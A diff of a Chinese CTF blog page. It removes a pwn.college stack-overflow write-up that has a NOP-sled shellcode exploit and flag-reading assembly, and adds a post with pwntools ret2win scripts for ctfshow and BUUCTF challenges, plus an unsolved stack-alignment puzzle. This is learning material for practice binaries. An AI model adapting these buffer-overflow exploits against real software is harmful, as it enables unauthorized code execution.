@@ -19,24 +19,34 @@
   <meta name="author" content="">
   <meta name="keywords" content="">
   
-    <meta name="description" content="题目简介基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址 漏洞点分析分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略接下来用checksec看一下开了哪些保护发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode 漏洞点">
+    <meta name="description" content="pwn的坑之堆栈平衡今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hijack-to-Shellcode">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/18/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/index.html">
+<meta property="og:title" content="Binary-Exp">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/19/Questions/Pwn-Question/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="题目简介基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址 漏洞点分析分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略接下来用checksec看一下开了哪些保护发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode 漏洞点">
+<meta property="og:description" content="pwn的坑之堆栈平衡今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png">
-<meta property="article:published_time" content="2025-07-18T13:17:03.000Z">
-<meta property="article:modified_time" content="2025-07-20T02:34:48.430Z">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/ctfshow-pwn02-main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/ctfshow-pwn02-pwnme.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/ctfshow-pwn02-stack.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/BUUCTF-file.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/BUUCTF-rip-main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/BUUCTF-rip-fun.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/BUUCTF-rip-checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/BUUCTF-rip-objdump.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/BUUCTF-rip-fail.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/debug1.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/debug2.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/debug3.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/fail.png">
+<meta property="article:published_time" content="2025-07-19T12:59:21.000Z">
+<meta property="article:modified_time" content="2025-07-20T02:10:10.270Z">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q1/ctfshow-pwn02-main.png">
   
   
   
-  <title>Hijack-to-Shellcode - 0x4A</title>
+  <title>Binary-Exp - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -190,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hijack-to-Shellcode"></span>
+            <span id="subtitle" data-typed-text="Binary-Exp"></span>
           
         </div>
 
@@ -201,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-18 21:17" pubdate>
-          July 18, 2025 pm
+        <time datetime="2025-07-19 20:59" pubdate>
+          July 19, 2025 pm
         </time>
       </span>
     
@@ -213,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          789 words
+          975 words
         
       </span>
     
@@ -224,7 +234,7 @@
         
         
         
-          7 mins
+          9 mins
         
       </span>
     
@@ -261,18 +271,22 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hijack-to-Shellcode</h1>
+            <h1 id="seo-header">Binary-Exp</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>基础的栈溢出，在&#x2F;challenge目录下仅存在一个ELF文件，无源代码，需要我们构造输入劫持返回地址，根据题目名字能猜到是要劫持到shellcode起始地址</p>
-<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>分析一个程序首先要分析有没有溢出点，溢出点在哪里。分析方法和上一题一致，这里省略<br><br>接下来用checksec看一下开了哪些保护<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/checksec.png" srcset="/img/loading.gif" lazyload><br>发现保护全关，因此漏洞点就是缓冲区溢出覆写返回地址，劫持到我们的shellcode<br></p>
-<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，可以采用和上一题相同的方法，最后计算得到偏移量&#x3D;120<br><br>第二步需要确定返回地址，即我们的shellcode的起始地址是哪，首先很自然想到将shellcode放在返回地址后面<br><br>通过gdb，在challenge函数的ret指令处打下断点，程序将停在ret指令之前，此时再次使用x命令查看$rsp，由于ret本质是进行pop rip操作，因此rsp此时指向的第一个内存格子就是返回地址,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/ret-breakpoint.png" srcset="/img/loading.gif" lazyload><br>从图中看到返回地址&#x3D;0x7fffffffd608，因此应该将返回地址覆写为0x7fffffffd610，但是不能这么干，因为这样gdb调试得到的返回地址其实是不准确的，因为gdb会引入一些环境变量导致栈的空间改变<br><br>在实战中，更多采用NOP滑行的方法，即在真正的shellcode之前填入若干个NOP指令，返回地址只要确定一个大概范围，最后能命中这些NOP里的任何一个即可，这里我选择的是0x7fffffffd660，在返回地址后面0x50个字节。<br><br>现在可以编写出如下的exp了<br></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="getshell的临门一脚"><a href="#getshell的临门一脚" class="headerlink" title="getshell的临门一脚"></a>getshell的临门一脚</h1><p>很遗憾，上述脚本实测无法打通，这是由于pwn.college的问题，子进程并没有继承root权限，导致读取&#x2F;flag文件时权限错误<br><br>至于为什么出现这种原因，怀疑是pwn.college服务器的sh是指向bash的，由于目标程序是通过SUID获得了root权限，而bash解释器默认会阻止SUID程序的子进程继承权限（不同于zsh等）。所以调用&#x2F;bin&#x2F;sh没有root<br><br>有2种办法解决，一个是在调用&#x2F;bin&#x2F;sh之前进行一次setuid(0)的操作，另一种是改一下shellcode，直接通过系统调用完成输出flag，我这题采用了后者<br><br>最终exp.py如下<br></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr=<span class="hljs-number">0x7fffffffd660</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;/challenge/binary-exploitation-hijack-to-shellcode&#x27;</span>)<br>shellcode= asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.intel_syntax noprefix</span><br><span class="hljs-string">mov r10,0x67616c662f2f2f2f</span><br><span class="hljs-string">shr r10,24</span><br><span class="hljs-string">push r10</span><br><span class="hljs-string">lea rdi,[rsp]</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 2</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">sub rsp,100</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">push 100</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">lea rsi,[rsp]</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">120</span>+p64(returnAddr)+<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x200</span>+shellcode<br>p.recvuntil(<span class="hljs-string">&#x27;Send your payload (up to 4096 bytes)!\n&#x27;</span>)<br>p.send(payload)<br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure>
-<p>最后也是成功拿到了flag<br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/Hijack-to-Shellcode/flag.png" srcset="/img/loading.gif" lazyload></p>
+                <h1 id="pwn的坑之堆栈平衡"><a href="#pwn的坑之堆栈平衡" class="headerlink" title="pwn的坑之堆栈平衡"></a>pwn的坑之堆栈平衡</h1><p>今天做了两道最基本的溢出题，就是劫持控制流到后门函数，思路和方法理论上是一样的，但是一道能打通一道打不通，至今百思不得其解，因此记录一下以待来日<br></p>
+<span id="more"></span>
+<h1 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h1><h2 id="ctfshow-pwn02"><a href="#ctfshow-pwn02" class="headerlink" title="ctfshow-pwn02"></a>ctfshow-pwn02</h2><p>第一题，是ctfshow上的题目，给了一个32位程序stack，拖到IDA里看一下，main调用了pwnme函数，溢出点在pwnme，还有一个stack函数调用的system<br><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-main.png" srcset="/img/loading.gif" lazyload><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-pwnme.png" srcset="/img/loading.gif" lazyload><br><img src="/../../photos/Questions/Pwn-Q1/ctfshow-pwn02-stack.png" srcset="/img/loading.gif" lazyload><br>然后checksec看了下只开了NX，但无所谓了，又不执行shellcode，管它NX呢<br><br>接下来就是一些算偏移，找返回地址的操作<br><br>一系列操作以后得到偏移offset&#x3D;13，stack函数的地址&#x3D;0x804850f<br><br>然后写脚本，填充好垃圾数据，没开PIE的话把stack函数的地址写死就行，写出如下一个简单的脚本：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/ctfshow-pwn02/stack&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;32bits\n&quot;</span>)<br>returnAddr=<span class="hljs-number">0x804850f</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">13</span>+p32(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+<p>运行以后就可以直接拿到shell了</p>
+<h2 id="BUUCTF-Pwn-rip"><a href="#BUUCTF-Pwn-rip" class="headerlink" title="BUUCTF-Pwn-rip"></a>BUUCTF-Pwn-rip</h2><p>然后来到第二题，也就作妖的这题，这是BUUCTF上的题目，Pwn下的第二题rip，给了一个pwn1的64位ELF文件（从下图的file输出可以看到）<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-file.png" srcset="/img/loading.gif" lazyload><br>拖到IDA里可以看到溢出点发生在main函数的gets<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-main.png" srcset="/img/loading.gif" lazyload><br>然后有一个fun函数，直接调用了system<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fun.png" srcset="/img/loading.gif" lazyload><br>按道理直接劫持到这个fun就可以<br><br>那就算一下偏移，看到main里面的缓冲区在rbp-0xf，+8，offset&#x3D;23<br><br>再checksec，看到没开PIE<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-checksec.png" srcset="/img/loading.gif" lazyload><br>那就可以直接在脚本里写死fun函数的地址，objdump看下fun函数在哪，如下图<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-objdump.png" srcset="/img/loading.gif" lazyload><br>于是按道理，学着第一题的思路，填充好offset，把返回地址写死成0x401186就肯定可以拿到shell，脚本也是这么写的<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401186</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+<p>但是，离谱的事情出现了，每次在interactive以后都会收到EOF<br><br><img src="/../../photos/Questions/Pwn-Q1/BUUCTF-rip-fail.png" srcset="/img/loading.gif" lazyload><br>然后，如果改成下面这样的利用脚本，就没有问题<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#ioTube=remote(&quot;pwn.challenge.ctf.show&quot;,28311,level=&quot;debug&quot;)</span><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioTube=process(<span class="hljs-string">&quot;/home/ubuntu/CTF/Pwn/pwn1&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;please input\n&quot;</span>)<br>offset=<span class="hljs-number">23</span><br>returnAddr=<span class="hljs-number">0x401187</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(returnAddr)<br>ioTube.sendline(payload)<br>ioTube.recv()<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
+<p>是的，仅仅是返回地址+1，后面又陆续尝试了别的返回地址，发现只要跳过fun函数的第一条指令，即push rbp，就可以<br><br>博主大感震撼并表示不理解，遂尝试gdb单步调试，看看到底怎么个事儿<br><br>从下面这张图可以明显看到rsp指向了我们要的0x401186，按道理ret指令结束后一定是去执行fun函数<br><br><img src="/../../photos/Questions/Pwn-Q1/debug1.png" srcset="/img/loading.gif" lazyload><br>并且接着si调试，可以看到，甚至它真的进到fun函数里面了<br><br><img src="/../../photos/Questions/Pwn-Q1/debug2.png" srcset="/img/loading.gif" lazyload><br>然后call system这里下个断点，可以正常执行完call指令前的所有指令<br><br><img src="/../../photos/Questions/Pwn-Q1/debug3.png" srcset="/img/loading.gif" lazyload><br>但是，最离谱的是，现在，在call system这里按下c键，让它继续执行，直接就崩溃<br><img src="/../../photos/Questions/Pwn-Q1/fail.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>这下博主彻底懵逼，这两个程序按道理完全一样的，只是改了下偏移和后门函数地址<br><br>唯二个人感觉可以算的上区别的：ctfshow的题目是32位，BUUCTF是64位；以及ctfshow的溢出点在pwnme函数，不在主函数，而BUUCTF的溢出点在主函数<br><br>在网上一番搜索无果，只找到一篇博客提到是堆栈平衡的缘故<br><br>可惜，截止目前依然不知道为什么BUUCTF这题一定要跳过push rbp的指令，只能先把问题记录下来…………</p>
 
                 
               </div>
@@ -291,20 +305,13 @@
     
       <span class="category-chain">
         
-  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/" class="category-chain-item">pwn.college题解</a>
+  <a href="/categories/%E7%96%91%E9%97%AE%E5%92%8C%E8%B8%A9%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/" class="category-chain-item">疑问和踩过的一些坑</a>
   
   
     <span>></span>
     
-  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/intro/" class="category-chain-item">intro</a>
+  <a href="/categories/%E7%96%91%E9%97%AE%E5%92%8C%E8%B8%A9%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/Pwn/" class="category-chain-item">Pwn</a>
   
-  
-    <span>></span>
-    
-  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/intro/Pwn/" class="category-chain-item">Pwn</a>
-  
-  
-
   
 
   
@@ -325,15 +332,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hijack-to-Shellcode</div>
-      <div>http://0x4a-210.github.io/2025/07/18/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/</div>
+      <div>Binary-Exp</div>
+      <div>http://0x4a-210.github.io/2025/07/19/Questions/Pwn-Question/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>July 18, 2025</div>
+          <div>July 19, 2025</div>
         </div>
       
       
@@ -365,9 +372,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/19/TogetherReview/Binary-Exp/" title="Binary-Exp">
+                      <a href="/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Control-Hijack/" title="Control-Hijack">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Binary-Exp</span>
+                        <span class="hidden-mobile">Control-Hijack</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -375,8 +382,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-5/" title="CSRF-5">
-                        <span class="hidden-mobile">CSRF-5</span>
+                      <a href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/NULL-Free-Shellcode/" title="NULL-Free-Shellcode">
+                        <span class="hidden-mobile">NULL-Free-Shellcode</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
